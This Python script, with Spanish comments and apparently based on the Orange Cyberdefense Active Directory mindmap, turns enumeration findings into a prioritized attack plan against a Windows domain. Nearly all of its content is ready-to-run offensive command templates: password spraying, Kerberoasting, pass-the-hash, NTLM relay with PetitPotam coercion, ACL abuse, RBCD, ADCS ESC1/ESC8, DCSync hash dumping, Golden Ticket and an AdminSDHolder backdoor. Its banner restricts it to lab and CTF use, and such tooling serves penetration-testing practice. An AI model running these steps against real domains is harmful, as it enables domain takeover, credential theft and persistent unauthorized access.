#!/usr/bin/env python3
"""
AD Attack Path Tool — basado en Orange Cyberdefense AD Mindmap 2025
Para uso exclusivo en entornos controlados: HTB, THM, VulnHub, labs propios.
"""

import json
import sys
import argparse
from dataclasses import dataclass, field
from typing import Optional
from enum import Enum

# ─────────────────────────────────────────────
#  MODELOS DE DATOS
# ─────────────────────────────────────────────

class Phase(Enum):
    RECON      = 1
    ENUM       = 2
    EXPLOIT    = 3
    ESCALATE   = 4
    PERSIST    = 5


@dataclass
class Finding:
    """Hallazgo de enumeración aportado por el usuario."""
    type: str          # ver FINDING_TYPES más abajo
    value: str = ""    # dato concreto (usuario, IP, hash, etc.)
    extra: dict = field(default_factory=dict)


@dataclass
class AttackStep:
    phase: Phase
    name: str
    description: str
    commands: list[str]
    opsec_risk: str    # LOW / MEDIUM / HIGH
    priority: int      # 1 = más alta prioridad
    prerequisites: list[str] = field(default_factory=list)
    next_steps: list[str] = field(default_factory=list)


# ─────────────────────────────────────────────
#  TIPOS DE HALLAZGOS RECONOCIDOS
# ─────────────────────────────────────────────

FINDING_TYPES = {
    # Credenciales
    "creds_plaintext":      "Usuario + contraseña en texto plano",
    "creds_hash_ntlm":      "Hash NTLM de usuario",
    "creds_hash_net_ntlmv2":"Hash Net-NTLMv2 capturado",
    "creds_kerberoast":     "Hash TGS para Kerberoasting",
    "creds_asrep":          "Hash AS-REP para crackeo offline",
    "ticket_tgt":           "TGT Kerberos válido",
    "ticket_tgs":           "TGS Kerberos válido",
    # Accesos
    "smb_open":             "Puerto SMB (445) accesible",
    "smb_signing_off":      "SMB Signing deshabilitado",
    "smb_share_readable":   "Share SMB legible",
    "smb_share_writable":   "Share SMB escribible",
    "smb_guest":            "Acceso SMB anónimo / Guest habilitado",
    "winrm_open":           "Puerto WinRM (5985/5986) accesible",
    "ldap_open":            "LDAP/LDAPS accesible",
    "rdp_open":             "RDP accesible",
    "mssql_open":           "MSSQL accesible",
    # Usuarios / grupos
    "user_no_preauth":      "Usuario sin Kerberos pre-autenticación (AS-REP Roastable)",
    "user_spn":             "Usuario con SPN definido (Kerberoastable)",
    "user_admincount":      "Usuario con AdminCount=1",
    "group_domain_admin":   "Pertenencia a Domain Admins",
    "group_local_admin":    "Admin local en algún equipo",
    # Delegaciones
    "deleg_unconstrained":  "Delegación Kerberos irrestricta (Unconstrained)",
    "deleg_constrained":    "Delegación Kerberos restringida (Constrained)",
    "deleg_rbcd":           "Resource-Based Constrained Delegation configurable",
    # ACLs / permisos en AD
    "acl_genericall":       "GenericAll sobre objeto AD",
    "acl_genericwrite":     "GenericWrite sobre objeto AD",
    "acl_writedacl":        "WriteDACL sobre objeto AD",
    "acl_writeowner":       "WriteOwner sobre objeto AD",
    "acl_forcechangepw":    "ForceChangePassword sobre usuario",
    "acl_dcsync":           "DCSync rights (DS-Replication-Get-Changes-All)",
    # Certificados
    "adcs_present":         "Active Directory Certificate Services presente",
    "adcs_esc1":            "ESC1: plantilla vulnerable con Client Auth + SAN editable",
    "adcs_esc4":            "ESC4: escritura sobre plantilla de certificado",
    "adcs_esc8":            "ESC8: Web Enrollment sin HTTPS (NTLM relay a ADCS)",
    # Otros vectores
    "gpo_writable":         "GPO escribible por usuario actual",
    "sysvol_password":      "Contraseña en SYSVOL/GPP",
    "laps_readable":        "LAPS: contraseña local visible en atributo AD",
    "coerce_possible":      "Coerción NTLM posible (PetitPotam / PrinterBug)",
    "shadow_creds":         "msDS-KeyCredentialLink escribible (Shadow Credentials)",
    "bloodhound_path":      "BloodHound muestra ruta hacia DA",
}

# ─────────────────────────────────────────────
#  MOTOR DE RUTAS DE ATAQUE
# ─────────────────────────────────────────────

def build_attack_steps(findings: list[Finding], target_ip: str, domain: str, dc_ip: str) -> list[AttackStep]:
    steps: list[AttackStep] = []
    finding_types = {f.type for f in findings}
    finding_map = {f.type: f for f in findings}

    def get_val(ftype: str, default: str = "<valor>") -> str:
        return finding_map[ftype].value if ftype in finding_map else default

    user     = get_val("creds_plaintext", "<usuario>").split(":")[0] if "creds_plaintext" in finding_map else "<usuario>"
    password = get_val("creds_plaintext", "<usuario>:<pass>").split(":")[-1] if "creds_plaintext" in finding_map else "<pass>"
    ntlm     = get_val("creds_hash_ntlm", "<LM>:<NTLM>")
    domain_dn = ",DC=".join(domain.split("."))

    # ── RECONOCIMIENTO ──────────────────────────────────────────────────

    if "smb_open" in finding_types or not finding_types:
        steps.append(AttackStep(
            phase=Phase.RECON,
            name="Descubrimiento de servicios SMB / LDAP",
            description="Identificar hosts con SMB expuesto y verificar SMB Signing.",
            commands=[
                f"nmap -p 445,139,389,636,5985,3389 --open -T3 {target_ip}/24 -oN smb_scan.txt",
                f"netexec smb {target_ip}/24 --gen-relay-list relay_targets.txt",
            ],
            opsec_risk="LOW",
            priority=10,
            next_steps=["smb_signing_off", "smb_guest", "ldap_open"],
        ))

    if "ldap_open" in finding_types:
        steps.append(AttackStep(
            phase=Phase.RECON,
            name="Enumeración LDAP anónima",
            description="Volcar información básica del dominio sin credenciales.",
            commands=[
                f"ldapsearch -x -H ldap://{dc_ip} -b 'DC={domain_dn}' -s base",
                f"enum4linux-ng -A {dc_ip} 2>/dev/null | tee enum4linux_out.txt",
            ],
            opsec_risk="LOW",
            priority=9,
        ))

    # ── AS-REP ROASTING (sin credenciales) ─────────────────────────────

    if "user_no_preauth" in finding_types or "ldap_open" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ENUM,
            name="AS-REP Roasting (sin credenciales)",
            description="Usuarios sin pre-autenticación Kerberos entregan hash crackeable offline.",
            commands=[
                f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -no-pass -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -format hashcat -outputfile asrep_hashes.txt",
                f"hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force",
            ],
            opsec_risk="LOW",
            priority=8,
            next_steps=["creds_plaintext"],
        ))

    # ── PASSWORD SPRAYING ───────────────────────────────────────────────

    if "smb_open" in finding_types and "creds_plaintext" not in finding_types:
        steps.append(AttackStep(
            phase=Phase.ENUM,
            name="Password Spraying (OPSEC: 1 intento / usuario)",
            description="Probar contraseña común contra todos los usuarios. Máx 1 intento para evitar lockout.",
            commands=[
                f"kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt 'Password123!' 2>&1 | tee spray_out.txt",
                f"netexec smb {dc_ip} -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success",
            ],
            opsec_risk="MEDIUM",
            priority=7,
            next_steps=["creds_plaintext"],
        ))

    # ── SMB ANÓNIMO / GUEST ────────────────────────────────────────────

    if "smb_guest" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ENUM,
            name="Enumeración SMB sin credenciales",
            description="Acceso anónimo o Guest puede exponer shares con información sensible.",
            commands=[
                f"smbmap -H {target_ip} -u '' -p ''",
                f"netexec smb {target_ip} -u '' -p '' --shares",
                f"netexec smb {target_ip} -u 'guest' -p '' --shares",
                f"impacket-smbclient //{target_ip}/SYSVOL -N",
            ],
            opsec_risk="LOW",
            priority=8,
            next_steps=["sysvol_password", "smb_share_readable"],
        ))

    # ── CONTRASEÑA EN SYSVOL / GPP ─────────────────────────────────────

    if "sysvol_password" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Extracción de credenciales GPP / SYSVOL",
            description="Las políticas de grupo antiguas almacenan contraseñas cifradas con clave pública conocida.",
            commands=[
                f"netexec smb {dc_ip} -u {user} -p {password} -M gpp_password",
                f"netexec smb {dc_ip} -u {user} -p {password} -M gpp_autologin",
                "python3 -c \"import base64,hashlib; from Crypto.Cipher import AES; ...\"  # gpp-decrypt manual",
                "gpp-decrypt '<ciphertext>'",
            ],
            opsec_risk="LOW",
            priority=9,
        ))

    # ── CON CREDENCIALES: ENUMERACIÓN LDAP ────────────────────────────

    if "creds_plaintext" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ENUM,
            name="Enumeración LDAP autenticada + BloodHound",
            description="Con credenciales válidas se puede volcar todo el AD para análisis de rutas.",
            commands=[
                f"bloodhound-python -u {user} -p {password} -d {domain} -dc {dc_ip} -c All --zip 2>&1 | tee bh_collection.log",
                f"ldapdomaindump -u '{domain}\\\\{user}' -p {password} ldap://{dc_ip} -o ldap_dump/",
                f"netexec smb {dc_ip} -u {user} -p {password} --users --groups --shares",
            ],
            opsec_risk="MEDIUM",
            priority=10,
            next_steps=["bloodhound_path", "user_spn", "user_no_preauth", "acl_genericall"],
        ))

    # ── KERBEROASTING ──────────────────────────────────────────────────

    if "user_spn" in finding_types or "creds_plaintext" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Kerberoasting",
            description="Solicitar TGS para cuentas con SPN → crackeo offline del hash.",
            commands=[
                f"impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerberoast_hashes.txt",
                f"hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force",
            ],
            opsec_risk="LOW",
            priority=9,
            next_steps=["creds_plaintext"],
        ))

    # ── LAPS ──────────────────────────────────────────────────────────

    if "laps_readable" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Lectura de contraseñas LAPS",
            description="Si el usuario tiene permiso, puede leer la contraseña local admin del atributo ms-Mcs-AdmPwd.",
            commands=[
                f"netexec ldap {dc_ip} -u {user} -p {password} -M laps",
                f"impacket-GetADUsers -all {domain}/{user}:{password} -dc-ip {dc_ip} | grep -i laps",
                f"python3 -c \"import ldap3; ...\"  # ldap3 query ms-Mcs-AdmPwd",
            ],
            opsec_risk="LOW",
            priority=10,
            next_steps=["group_local_admin"],
        ))

    # ── PASS-THE-HASH ──────────────────────────────────────────────────

    if "creds_hash_ntlm" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Pass-the-Hash (PtH)",
            description="Reutilizar hash NTLM sin necesidad de crackear la contraseña.",
            commands=[
                f"netexec smb {target_ip}/24 -u {user} -H {ntlm} --local-auth",
                f"netexec smb {target_ip}/24 -u {user} -H {ntlm}",
                f"evil-winrm -i {target_ip} -u {user} -H {ntlm}",
                f"impacket-psexec {domain}/{user}@{target_ip} -hashes {ntlm}",
            ],
            opsec_risk="MEDIUM",
            priority=9,
            next_steps=["group_local_admin", "group_domain_admin"],
        ))

    # ── NTLM RELAY ─────────────────────────────────────────────────────

    if "smb_signing_off" in finding_types or "coerce_possible" in finding_types:
        coerce_cmd = f"python3 PetitPotam.py -u {user} -p {password} -d {domain} <attacker_ip> {dc_ip}" \
                     if "coerce_possible" in finding_types else \
                     f"# Esperar autenticación NTLM espontánea (Responder)"
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="NTLM Relay Attack",
            description="Capturar y reenviar autenticaciones NTLM hacia hosts sin SMB signing.",
            commands=[
                "# Terminal 1: apagar SMB/HTTP en Responder para no interferir",
                f"sudo responder -I eth0 -dwv --no-smb --no-http",
                "# Terminal 2: relay hacia targets",
                f"sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -l loot/",
                "# Terminal 3: coerción (si disponible)",
                coerce_cmd,
            ],
            opsec_risk="HIGH",
            priority=8,
            next_steps=["creds_hash_ntlm", "smb_share_readable"],
        ))

    # ── ACCESO INICIAL CON CREDENCIALES ───────────────────────────────

    if "creds_plaintext" in finding_types and "winrm_open" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Shell remota vía WinRM (evil-winrm)",
            description="Con credenciales válidas y WinRM activo, shell interactiva inmediata.",
            commands=[
                f"evil-winrm -i {target_ip} -u {user} -p {password}",
                f"evil-winrm -i {target_ip} -u {user} -p {password} -s /opt/scripts/ -e /opt/exes/",
            ],
            opsec_risk="MEDIUM",
            priority=10,
            next_steps=["group_local_admin"],
        ))

    if "creds_plaintext" in finding_types and "smb_open" in finding_types:
        steps.append(AttackStep(
            phase=Phase.EXPLOIT,
            name="Ejecución remota vía SMB (psexec / smbexec)",
            description="Ejecutar comandos remotos via SMB con credenciales válidas.",
            commands=[
                f"impacket-psexec {domain}/{user}:{password}@{target_ip}",
                f"impacket-smbexec {domain}/{user}:{password}@{target_ip}  # más sigiloso",
                f"netexec smb {target_ip} -u {user} -p {password} -x 'whoami /all'",
            ],
            opsec_risk="HIGH",
            priority=7,
            next_steps=["group_domain_admin"],
        ))

    # ── ABUSOS DE ACL ──────────────────────────────────────────────────

    if "acl_genericall" in finding_types:
        target_obj = get_val("acl_genericall", "<objeto_AD>")
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="Abuso GenericAll → Reset de contraseña / Shadow Credentials",
            description="GenericAll sobre usuario permite cambiar su contraseña o añadir Shadow Credentials.",
            commands=[
                f"# Opción A: cambiar contraseña (ruidoso)",
                f"net rpc password {target_obj} 'NuevaPass123!' -U {domain}/{user}%{password} -S {dc_ip}",
                f"# Opción B: Shadow Credentials (silencioso, requiere PKINIT)",
                f"python3 pywhisker.py -d {domain} -u {user} -p {password} --target {target_obj} --action add --dc-ip {dc_ip}",
                f"python3 PKINITtools/gettgtpkinit.py {domain}/{target_obj} -cert-pfx <output.pfx> -pfx-pass <pass> {target_obj}.ccache",
            ],
            opsec_risk="MEDIUM",
            priority=10,
            next_steps=["creds_plaintext", "ticket_tgt"],
        ))

    if "acl_writedacl" in finding_types:
        target_obj = get_val("acl_writedacl", "<objeto_AD>")
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="Abuso WriteDACL → Conceder DCSync rights",
            description="Con WriteDACL sobre el dominio se pueden otorgar permisos de DCSync al usuario.",
            commands=[
                f"# Con PowerView (desde sesión Windows)",
                f"Add-DomainObjectAcl -TargetIdentity '{domain}' -PrincipalIdentity '{user}' -Rights DCSync",
                f"# Con impacket (desde Linux)",
                f"python3 dacledit.py -action write -rights DCSync -principal {user} -target-dn 'DC={domain_dn}' {domain}/{user}:{password} -dc-ip {dc_ip}",
            ],
            opsec_risk="MEDIUM",
            priority=10,
            next_steps=["acl_dcsync"],
        ))

    if "acl_forcechangepw" in finding_types:
        target_obj = get_val("acl_forcechangepw", "<usuario_objetivo>")
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="Abuso ForceChangePassword",
            description="Cambiar la contraseña de otro usuario sin conocer la actual.",
            commands=[
                f"net rpc password {target_obj} 'Pwned@2025!' -U {domain}/{user}%{password} -S {dc_ip}",
                f"impacket-changepasswd {domain}/{user}:{password}@{dc_ip} -newpass 'Pwned@2025!' -altuser {target_obj} -no-pass",
            ],
            opsec_risk="HIGH",
            priority=9,
            next_steps=["creds_plaintext"],
        ))

    # ── DELEGACIÓN KERBEROS ────────────────────────────────────────────

    if "deleg_unconstrained" in finding_types:
        deleg_host = get_val("deleg_unconstrained", "<host_con_delegacion>")
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="Unconstrained Delegation + Coerción → TGT del DC",
            description="Un host con delegación irrestricta almacena TGTs. Coercionando al DC obtenemos su TGT.",
            commands=[
                f"# En el host con delegación irrestricta:",
                f"Rubeus.exe monitor /interval:5 /nowrap  # esperar TGT",
                f"# Coercionar al DC desde atacante:",
                f"python3 PetitPotam.py -u {user} -p {password} -d {domain} {deleg_host} {dc_ip}",
                f"# Importar el TGT capturado y hacer DCSync:",
                f"Rubeus.exe ptt /ticket:<base64_ticket>",
                f"impacket-secretsdump -k -no-pass {domain}/{dc_ip}",
            ],
            opsec_risk="HIGH",
            priority=10,
            next_steps=["acl_dcsync"],
        ))

    if "deleg_rbcd" in finding_types:
        target_host = get_val("deleg_rbcd", "<host_objetivo>")
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="Resource-Based Constrained Delegation (RBCD)",
            description="Si podemos escribir msDS-AllowedToActOnBehalfOfOtherIdentity, podemos impersonar cualquier usuario.",
            commands=[
                f"# 1. Crear cuenta de máquina (necesitamos MachineAccountQuota > 0)",
                f"impacket-addcomputer {domain}/{user}:{password} -dc-ip {dc_ip} -computer-name 'EVILPC$' -computer-pass 'EvilPass123!'",
                f"# 2. Configurar RBCD",
                f"python3 rbcd.py -f EVILPC -t {target_host} -dc-ip {dc_ip} {domain}/{user}:{password}",
                f"# 3. Obtener ticket impersonando Administrator",
                f"impacket-getST {domain}/EVILPC\\$:'EvilPass123!' -spn cifs/{target_host}.{domain} -impersonate Administrator -dc-ip {dc_ip}",
                f"export KRB5CCNAME=Administrator.ccache",
                f"impacket-secretsdump -k -no-pass {domain}/Administrator@{target_host}.{domain}",
            ],
            opsec_risk="MEDIUM",
            priority=9,
            next_steps=["group_domain_admin"],
        ))

    # ── AD CERTIFICATE SERVICES ────────────────────────────────────────

    if "adcs_present" in finding_types or "adcs_esc1" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="ADCS ESC1 → Certificado como Domain Admin",
            description="Plantilla vulnerable permite solicitar cert con SAN arbitrario → impersonar DA.",
            commands=[
                f"# Enumerar plantillas vulnerables",
                f"certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -stdout",
                f"# Solicitar certificado como Administrator (ESC1)",
                f"certipy req -u {user}@{domain} -p {password} -ca '<CA_NAME>' -template '<TEMPLATE>' -upn administrator@{domain} -dc-ip {dc_ip}",
                f"# Autenticar con el certificado → obtener hash NTLM del DA",
                f"certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
            ],
            opsec_risk="LOW",
            priority=10,
            next_steps=["creds_hash_ntlm", "group_domain_admin"],
        ))

    if "adcs_esc8" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="ADCS ESC8 → NTLM Relay a Web Enrollment",
            description="Relay de autenticación NTLM del DC hacia la interfaz web de ADCS para obtener cert del DC.",
            commands=[
                f"# Relay hacia ADCS Web Enrollment",
                f"impacket-ntlmrelayx -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
                f"# Coerción del DC",
                f"python3 PetitPotam.py -u {user} -p {password} -d {domain} <attacker_ip> {dc_ip}",
                f"# Usar el certificado obtenido para DCSync",
                f"certipy auth -pfx dc.pfx -dc-ip {dc_ip}",
            ],
            opsec_risk="HIGH",
            priority=9,
            next_steps=["acl_dcsync"],
        ))

    # ── DCSYNC / VOLCADO FINAL ─────────────────────────────────────────

    if "acl_dcsync" in finding_types or "group_domain_admin" in finding_types:
        steps.append(AttackStep(
            phase=Phase.ESCALATE,
            name="DCSync → Volcado de todos los hashes del dominio",
            description="Con permisos de replicación se pueden obtener todos los hashes sin tocar LSASS.",
            commands=[
                f"impacket-secretsdump {domain}/{user}:{password}@{dc_ip} -just-dc-ntlm -outputfile dcsync_hashes.txt",
                f"impacket-secretsdump {domain}/{user}@{dc_ip} -hashes :{ntlm} -just-dc-ntlm",
            ],
            opsec_risk="HIGH",
            priority=10,
            next_steps=["creds_hash_ntlm"],
        ))

    # ── PERSISTENCIA ───────────────────────────────────────────────────

    if "group_domain_admin" in finding_types or "acl_dcsync" in finding_types:
        krbtgt = get_val("creds_hash_ntlm", "<krbtgt_hash>")
        domain_sid = "<domain_SID>"
        steps.append(AttackStep(
            phase=Phase.PERSIST,
            name="Golden Ticket",
            description="Con el hash de krbtgt se genera un TGT válido por 10 años para cualquier usuario.",
            commands=[
                f"# Obtener krbtgt hash (ya hecho con DCSync) y SID del dominio",
                f"impacket-lookupsid {domain}/{user}:{password}@{dc_ip} | grep 'Domain SID'",
                f"# Generar Golden Ticket",
                f"impacket-ticketer -nthash {krbtgt} -domain-sid {domain_sid} -domain {domain} Administrator",
                f"export KRB5CCNAME=Administrator.ccache",
                f"impacket-psexec -k -no-pass {domain}/Administrator@{dc_ip}",
            ],
            opsec_risk="HIGH",
            priority=5,
        ))

        steps.append(AttackStep(
            phase=Phase.PERSIST,
            name="AdminSDHolder Backdoor",
            description="Añadir GenericAll al AdminSDHolder propaga permisos a todos los grupos privilegiados cada 60 min.",
            commands=[
                f"python3 dacledit.py -action write -rights FullControl -principal {user} -target-dn 'CN=AdminSDHolder,CN=System,DC={domain_dn}' {domain}/{user}:{password} -dc-ip {dc_ip}",
                f"# Verificar tras 60 min",
                f"python3 dacledit.py -action read -target-dn 'CN=Domain Admins,CN=Users,DC={domain_dn}' {domain}/{user}:{password} -dc-ip {dc_ip}",
            ],
            opsec_risk="HIGH",
            priority=4,
        ))

    return steps


# ─────────────────────────────────────────────
#  PRIORIZACIÓN
# ─────────────────────────────────────────────

FINDING_PRIORITY_BOOST = {
    "creds_plaintext":    5,
    "creds_hash_ntlm":   4,
    "winrm_open":         3,
    "laps_readable":      4,
    "acl_dcsync":         5,
    "adcs_esc1":          4,
    "deleg_unconstrained":3,
    "smb_signing_off":    2,
    "acl_genericall":     3,
}

def prioritize_steps(steps: list[AttackStep], findings: list[Finding]) -> list[AttackStep]:
    finding_types = {f.type for f in findings}
    for step in steps:
        for prereq in step.prerequisites:
            if prereq in finding_types:
                step.priority += FINDING_PRIORITY_BOOST.get(prereq, 1)
    return sorted(steps, key=lambda s: (-s.priority, s.phase.value))


# ─────────────────────────────────────────────
#  VISUALIZACIÓN
# ─────────────────────────────────────────────

PHASE_COLORS = {
    Phase.RECON:    "\033[94m",   # azul
    Phase.ENUM:     "\033[96m",   # cyan
    Phase.EXPLOIT:  "\033[93m",   # amarillo
    Phase.ESCALATE: "\033[91m",   # rojo
    Phase.PERSIST:  "\033[95m",   # magenta
}
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"

OPSEC_COLOR = {"LOW": GREEN, "MEDIUM": YELLOW, "HIGH": RED}

BANNER = f"""{BOLD}\033[92m
╔═══════════════════════════════════════════════════════════╗
║        AD Attack Path Tool  —  OCD Mindmap 2025          ║
║        Solo para entornos controlados (HTB/THM/Lab)      ║
╚═══════════════════════════════════════════════════════════╝{RESET}
"""


def print_attack_path(steps: list[AttackStep], show_all: bool = False) -> None:
    print(BANNER)
    shown_phases = set()
    current_phase = None

    for i, step in enumerate(steps, 1):
        if step.phase != current_phase:
            current_phase = step.phase
            color = PHASE_COLORS[step.phase]
            print(f"\n{color}{BOLD}{'═'*60}")
            print(f"  FASE {step.phase.value}: {step.phase.name}")
            print(f"{'═'*60}{RESET}")

        opsec_color = OPSEC_COLOR[step.opsec_risk]
        print(f"\n{BOLD}[{i:02d}] {step.name}{RESET}")
        print(f"     OPSEC: {opsec_color}{step.opsec_risk}{RESET}  |  Prioridad: {step.priority}")
        print(f"     {step.description}")
        print(f"\n     {BOLD}Comandos:{RESET}")
        for cmd in step.commands:
            if cmd.startswith("#"):
                print(f"       \033[90m{cmd}{RESET}")
            else:
                print(f"       {GREEN}{cmd}{RESET}")

        if step.next_steps:
            print(f"\n     {BOLD}Siguiente hallazgo objetivo:{RESET} {', '.join(step.next_steps)}")

        if not show_all and i >= 5:
            remaining = len(steps) - i
            if remaining > 0:
                print(f"\n  ... {remaining} pasos adicionales (usa --all para ver todos)")
            break


def print_summary_table(steps: list[AttackStep]) -> None:
    print(f"\n{BOLD}{'─'*70}")
    print(f"  RESUMEN DE RUTA DE ATAQUE")
    print(f"{'─'*70}{RESET}")
    print(f"{'#':<4} {'Fase':<12} {'Nombre':<38} {'OPSEC':<8} {'Prio'}")
    print(f"{'─'*70}")
    for i, step in enumerate(steps, 1):
        oc = OPSEC_COLOR[step.opsec_risk]
        phase_color = PHASE_COLORS[step.phase]
        print(
            f"{i:<4} "
            f"{phase_color}{step.phase.name:<12}{RESET} "
            f"{step.name[:37]:<38} "
            f"{oc}{step.opsec_risk:<8}{RESET} "
            f"{step.priority}"
        )


# ─────────────────────────────────────────────
#  ENTRADA / PARSEO
# ─────────────────────────────────────────────

def load_findings_from_json(path: str) -> tuple[list[Finding], str, str, str]:
    with open(path) as f:
        data = json.load(f)

    target_ip = data.get("target_ip", "10.10.10.10")
    domain    = data.get("domain", "corp.local")
    dc_ip     = data.get("dc_ip", target_ip)

    findings = []
    for item in data.get("findings", []):
        findings.append(Finding(
            type=item["type"],
            value=item.get("value", ""),
            extra=item.get("extra", {}),
        ))
    return findings, target_ip, domain, dc_ip


def interactive_mode() -> tuple[list[Finding], str, str, str]:
    print(BANNER)
    print(f"{BOLD}Modo interactivo — ingresa los hallazgos de tu enumeración{RESET}\n")

    target_ip = input("IP / rango objetivo (ej: 10.10.10.10): ").strip() or "10.10.10.10"
    domain    = input("Dominio AD (ej: corp.local): ").strip() or "corp.local"
    dc_ip     = input(f"IP del DC [{target_ip}]: ").strip() or target_ip

    print(f"\n{BOLD}Tipos de hallazgos disponibles:{RESET}")
    for k, v in FINDING_TYPES.items():
        print(f"  {GREEN}{k:<28}{RESET} {v}")

    print(f"\n{BOLD}Ingresa tus hallazgos (tipo:valor). Deja vacío para terminar.{RESET}")
    print("  Ejemplo: creds_plaintext:john:Password123")
    print("  Ejemplo: smb_signing_off")
    print("  Ejemplo: user_spn:svc_sql")

    findings = []
    while True:
        raw = input("> ").strip()
        if not raw:
            break
        parts = raw.split(":", 1)
        ftype = parts[0].strip()
        fval  = parts[1].strip() if len(parts) > 1 else ""
        if ftype not in FINDING_TYPES:
            print(f"  {RED}Tipo desconocido: {ftype}{RESET}")
            continue
        findings.append(Finding(type=ftype, value=fval))
        print(f"  {GREEN}✓ Añadido: {ftype}{RESET}")

    return findings, target_ip, domain, dc_ip


# ─────────────────────────────────────────────
#  EXPORTACIÓN
# ─────────────────────────────────────────────

def export_report(steps: list[AttackStep], out_path: str) -> None:
    report = {
        "generated": "AD Attack Path Tool — OCD Mindmap 2025",
        "total_steps": len(steps),
        "steps": [
            {
                "phase": s.phase.name,
                "name": s.name,
                "description": s.description,
                "opsec_risk": s.opsec_risk,
                "priority": s.priority,
                "commands": s.commands,
                "next_steps": s.next_steps,
            }
            for s in steps
        ],
    }
    with open(out_path, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"\n{GREEN}Reporte exportado → {out_path}{RESET}")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="AD Attack Path Tool — OCD Mindmap 2025 | Solo para entornos controlados"
    )
    parser.add_argument("-f", "--file",    help="Archivo JSON de hallazgos")
    parser.add_argument("-o", "--output",  help="Exportar ruta de ataque a JSON")
    parser.add_argument("--all",           action="store_true", help="Mostrar todos los pasos")
    parser.add_argument("--summary",       action="store_true", help="Solo tabla resumen")
    parser.add_argument("--list-findings", action="store_true", help="Listar tipos de hallazgos")
    args = parser.parse_args()

    if args.list_findings:
        print(f"\n{BOLD}Tipos de hallazgos reconocidos:{RESET}")
        for k, v in FINDING_TYPES.items():
            print(f"  {GREEN}{k:<30}{RESET} {v}")
        return

    if args.file:
        findings, target_ip, domain, dc_ip = load_findings_from_json(args.file)
    else:
        findings, target_ip, domain, dc_ip = interactive_mode()

    if not findings:
        print(f"\n{YELLOW}Sin hallazgos. Mostrando ruta de reconocimiento base.{RESET}")
        findings = [Finding(type="smb_open"), Finding(type="ldap_open")]

    steps = build_attack_steps(findings, target_ip, domain, dc_ip)
    steps = prioritize_steps(steps, findings)

    if args.summary:
        print_summary_table(steps)
    else:
        print_attack_path(steps, show_all=args.all)
        print_summary_table(steps)

    if args.output:
        export_report(steps, args.output)


if __name__ == "__main__":
    main()
